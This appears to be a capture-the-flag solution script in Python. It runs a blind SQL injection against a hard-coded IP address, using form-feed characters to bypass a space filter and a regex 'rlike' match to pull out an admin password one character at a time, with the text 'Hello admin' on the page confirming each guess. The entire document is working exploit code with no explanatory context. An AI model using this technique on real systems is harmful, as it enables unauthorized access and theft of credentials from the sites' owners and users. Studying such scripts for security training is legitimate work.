import requests
pay='1234567890abcdefghijklmnopqrstuvwxyz'
url = "http://52.66.243.74?bypass=%0c&pass='%0c||%0c(pw%0crlike%0c'^"#')"
password = ""
for i in range(0,21):
    for j in pay:
        re = requests.get(url+password+str(j)+"');%00")
        if "Hello admin" in re.text:
            password = password + str(j)
print(password)
